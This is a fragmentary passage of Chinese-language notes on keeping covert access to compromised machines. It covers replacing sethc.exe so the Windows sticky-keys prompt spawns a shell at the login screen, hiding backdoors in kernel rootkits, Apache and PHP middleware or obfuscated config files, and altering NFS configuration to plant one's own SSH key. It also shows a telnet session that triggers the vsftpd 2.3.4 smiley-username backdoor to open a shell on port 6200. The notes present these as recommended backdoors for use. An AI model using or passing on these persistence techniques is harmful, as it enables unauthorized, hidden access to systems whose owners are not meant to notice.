日志中可以查出来




windows登录界面的时候通过五次敲击Shift，触发粘滞键的询问，同时因为文件替换（被替换文件c:\windows\system32\sethc.exe）的原因，能触发自己指定的程序，可以是一个shell（稍后自己执行explorer.exe），也可以直接是explorer。exe从而进入界面。这个后门可以被远程桌面利用。




Rookit，隐藏在系统内核






隐藏在服务器中间件
apache隐藏在appction，做个本地包含，用递归好像可以弄个服务器启动自动生成后门，好像还有个端口复用的方法
PHP写内存循环
高级点就写配置文件里，混淆几段代码，做成一些组合漏洞



推荐的后门程序（配合端口敲击）：
直接开启一个shell
vsftpd 2.3.4  在username后面加上:)，之后就会在6200开启一个shell
	root@ubuntu:~# telnet 192.168.99.131 21
	Trying 192.168.99.131…
	Connected to 192.168.99.131.
	Escape character is '^]'.
	220 (vsFTPd 2.3.4)
	user backdoored:)
	331 Please specify the password.
	pass invalid
	^]
改变nfs配置文件从而能够将自己，sshkey直接写进去。而且不知道配置文件的人绝对不知道会有这个漏洞。



